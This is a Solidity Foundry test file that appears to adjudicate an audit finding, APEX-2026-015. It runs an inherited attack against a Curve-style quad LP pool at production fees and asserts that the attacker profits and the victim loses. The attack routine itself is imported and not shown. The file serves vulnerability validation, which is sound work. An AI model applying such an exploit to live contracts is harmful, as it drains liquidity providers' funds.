// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {CurveQuadLpDomainArb} from "./CurveQuadLpDomainArb.t.sol";

/// @notice Business-logic adjudication variant of APEX-2026-015 at production fee parameters
///         (FixtureEconomics: DEX_SWAP_FEE 3e14, USAGE_FEE 5e16 with feeTo set), attacker's OWN capital
///         (no flash fee), ownerOnlyLiquidity=false (permissionless standalone pool; DETF prod sets true).
contract AdjProdCurveQuadLp is CurveQuadLpDomainArb {
    function _prodPool(uint256 yieldBps) internal {
        _ensureFeeTo();
        _setUsageFee(5e16);
        _setUpPool(SEED * yieldBps / 10_000);
        _setDexFee(3e14);
    }

    function _go(uint256 yieldBps, uint256 cycles) internal returns (int256 profit, int256 victimDelta) {
        _prodPool(yieldBps);
        console2.log("yield bps", yieldBps);
        console2.log("rate leg0", quad.ratedBalance(0) * 1e18 / quad.nativeReserve(0));
        uint256 vb = _victimValue();
        uint256 end = _attack(cycles, CAPITAL);
        uint256 va = _victimValue();
        profit = int256(end) - int256(CAPITAL);
        victimDelta = int256(va) - int256(vb);
        console2.log("attacker profit (own capital, signed)");
        console2.logInt(profit);
        console2.log("victim delta (signed)");
        console2.logInt(victimDelta);
    }

    function test_adj_prod_yield_5pct() public {
        (int256 p, int256 d) = _go(500, 3);
        assertGt(p, 0);
        assertLt(d, 0);
    }

    function test_adj_prod_yield_1pct() public {
        _go(100, 3);
    }

    function test_adj_prod_yield_0_5pct() public {
        _go(50, 3);
    }

    function test_adj_prod_control() public {
        (int256 p,) = _go(0, 1);
        assertLt(p, 0);
    }
}
